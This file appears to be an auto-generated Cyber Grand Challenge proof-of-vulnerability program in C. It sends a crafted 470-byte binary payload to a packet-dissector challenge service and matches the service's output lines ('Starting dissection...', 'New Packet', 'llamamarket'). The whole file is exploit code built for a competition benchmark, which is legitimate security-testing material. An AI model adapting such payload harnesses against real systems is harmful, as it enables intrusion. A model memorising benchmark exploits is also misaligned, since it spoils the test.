#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xd6\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xbe\x01\x00\x00\xb6\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\xb6\x01\x00\x00"
         "\x71\x47\xde\x63\x0e\x15\x1e\xee\xb4\xc1\xb5\x89\xdb\xbc\x69\x22"
         "\xfe\x31\x74\x3e\x19\x00\x00\x00\x01\x78\x6d\x50\x3f\x70\xc6\x10"
         "\x6f\xcf\x4a\x2c\x17\xd5\xd3\x83\x4d\xb2\x01\x00\x18\x01\x00\xfa"
         "\x01\xc7\x44\xf2\x01\x48\x01\x00\x54\x49\x9c\x56\x48\xf0\xf1\x1e"
         "\xd5\x01\x00\xfe\x41\x00\xc6\xc8\xff\x46\x93\x59\xff\xff\x1b\x6b"
         "\x91\xf0\xdb\x91\x73\x3e\x42\xc1\xe7\x4c\xab\x48\x40\x0b\x01\xf8"
         "\x1f\xdd\xed\x9a\x01\x00\x0e\x0c\xa2\xf1\x0e\x52\x20\x39\xab\x41"
         "\x00\xff\x85\x96\x66\x1f\xc9\xae\x49\x26\x41\x00\x01\xb3\x78\x58"
         "\x01\xff\x11\xa2\x41\x00\x33\x0c\x59\x20\x01\x3f\x01\x0a\x01\x00"
         "\x12\xff\x43\x03\xd4\x75\x20\xd8\xb7\xbd\xa1\x69\x8a\xae\x67\x79"
         "\xb1\x53\x60\x00\x24\x00\x8e\x6a\xc1\x7b\x49\xca\x81\x6e\x85\xd7"
         "\x78\xd6\x20\x26\x37\xb1\xe0\x62\x1d\x20\x80\x02\x0e\xdf\x56\xed"
         "\xea\x03\x0b\xdd\xf2\xf9\x80\x77\x11\xe2\x94\x0d\x12\x67\x5e\xba"
         "\xcd\xe8\xb0\xd2\xf5\xae\xdb\x2b\x15\x51\x13\xc1\x9a\xc7\x72\x3a"
         "\xc4\xab\xb9\x6d\xba\x5d\x14\xb0\x1b\x27\x61\x6e\xd0\x53\xa0\xbd"
         "\x7c\xb1\xc7\x24\xb7\xdc\x68\xb5\x5c\x21\xb2\xa1\x23\x05\x39\x00"
         "\xa9\x51\xf5\xf8\x9f\x36\x9d\xc1\xcf\xb9\xb7\x93\xe5\x22\x23\xc2"
         "\x6c\x14\xbd\xff\xbb\x4f\x9d\xb8\x0a\x66\x93\xbc\x3a\xc6\x6f\x4b"
         "\x35\x85\x01\x74\x63\x5a\xbf\x31\x35\xb6\x25\xd2\xad\x4c\x1f\xa9"
         "\x8f\xab\xd4\x7d\x0b\x88\x44\x15\xd9\x7e\x72\xae\xc8\xea\x33\x23"
         "\x19\x19\x04\x29\x0d\xf3\x89\x8f\x21\xf3\x45\x02\x57\x43\xe2\xe2"
         "\x0c\x9a\x57\xc7\xda\x6d\x1e\xf8\x87\x67\xef\xd8\x6d\x3e\x20\xba"
         "\xb3\x67\xdf\x7b\xb7\x35\x1d\x7b\x63\x65\xcd\xae\xb9\xba\xd7\x8f"
         "\xdb\x42\x53\xb3\x48\x20\x96\xcc\x04\x5a\xe4\x1f\x7b\x68\x83\x0e"
         "\xa8\xf4\x06\xf0\xff\x96\x33\x26\x1d\x17\x76\xc1\x26\x71\xdb\xab"
         "\xb8\x41\x00\x41\x00\xcd\x19\x5e\xb9\x8b\xae\x92\xe2\x13\x55\x01"
         "\x00\x2b\x41\x00\x31\xc5\xc7\x7c\x20\x70\x1c\x16\x01\x49\x8a\x46"
         "\x92\xbf\x23\x32\xd7\x1f";
      static unsigned int write_00001_00000_len = 470;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamamarket
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x6d\x61\x72\x6b\x65\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
